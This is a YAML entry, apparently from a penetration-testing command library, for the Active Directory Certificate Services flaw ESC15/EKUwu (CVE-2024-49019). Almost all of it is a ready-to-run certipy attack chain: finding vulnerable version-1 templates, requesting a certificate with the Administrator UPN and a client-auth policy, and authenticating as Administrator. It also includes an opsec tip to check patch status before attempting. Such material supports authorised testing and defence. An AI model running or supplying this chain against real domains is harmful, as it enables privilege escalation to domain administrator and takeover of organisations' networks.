name: ADCSESC15
description: ESC15 (EKUwu) - CVE-2024-49019 - Schema Version 1 template with enrollee supplies subject
commands:
- '# ESC15 / EKUwu (CVE-2024-49019)'
- '# Schema version 1 templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT are vulnerable'
- '# Version 1 templates do not enforce Application Policies in certificate'
- ''
- '# Step 1: Find vulnerable version 1 templates'
- certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
- ''
- '# Look for:'
- '#   - msPKI-Template-Schema-Version = 1'
- '#   - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (msPKI-Certificate-Name-Flag)'
- '#   - Enrollment rights for non-admins'
- ''
- '# Step 2: Request certificate specifying admin UPN'
- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -application-policies '1.3.6.1.5.5.7.3.2'
- ''
- '# Step 3: Authenticate as Administrator'
- certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
opsec:
- Patched in November 2024 Windows updates
- Check if target is patched before attempting
references:
- https://trustedsec.com/blog/ekuwu-not-just-another-satisfying-satisfying-ad-cs-esc
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019
